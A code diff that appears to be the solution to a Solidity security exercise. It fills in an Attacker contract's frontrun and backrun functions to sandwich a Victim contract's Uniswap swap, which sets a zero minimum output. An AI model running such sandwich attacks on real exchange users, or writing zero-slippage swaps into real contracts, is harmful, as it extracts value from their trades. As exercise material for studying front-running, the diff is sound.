@@ -2,6 +2,7 @@
 pragma solidity ^0.8.13;
 
 import "./interfaces/IERC20.sol";
+import "../lib/forge-std/src/console.sol";
 
 /**
  *
@@ -15,13 +16,57 @@ import "./interfaces/IERC20.sol";
  */
 contract Attacker {
     // This function will be called before the victim's transaction.
-    function frontrun(address router, address weth, address usdc, uint256 deadline) public {
+
+    function frontrun(
+        address router,
+        address weth,
+        address usdc,
+        uint256 deadline
+    ) public {
         // your code here
+        IERC20(weth).approve(router, type(uint256).max);
+
+        address[] memory path = new address[](2);
+        path[0] = weth;
+        path[1] = usdc;
+        console.log(
+            "Attacker WETH balance:",
+            IERC20(weth).balanceOf(address(this))
+        );
+        IUniswapV2Router(router).swapExactTokensForTokens(
+            1000 * 1e18,
+            0,
+            path,
+            address(this),
+            deadline
+        );
+        console.log(
+            "Attacker WETH balance:",
+            IERC20(weth).balanceOf(address(this))
+        );
     }
 
     // This function will be called after the victim's transaction.
-    function backrun(address router, address weth, address usdc, uint256 deadline) public {
+    function backrun(
+        address router,
+        address weth,
+        address usdc,
+        uint256 deadline
+    ) public {
         // your code here
+        IERC20(usdc).approve(router, type(uint256).max);
+        address[] memory path = new address[](2);
+        path[0] = usdc;
+        path[1] = weth;
+
+        uint256 amountIn = IERC20(usdc).balanceOf(address(this));
+        IUniswapV2Router(router).swapExactTokensForTokens(
+            amountIn,
+            0,
+            path,
+            address(this),
+            deadline
+        );
     }
 }
 
@@ -33,7 +78,13 @@ contract Victim {
     }
 
     function performSwap(address[] calldata path, uint256 deadline) public {
-        IUniswapV2Router(router).swapExactTokensForTokens(1000 * 1e18, 0, path, address(this), deadline);
+        IUniswapV2Router(router).swapExactTokensForTokens(
+            1000 * 1e18,
+            0,
+            path,
+            address(this),
+            deadline
+        );
     }
 }
 
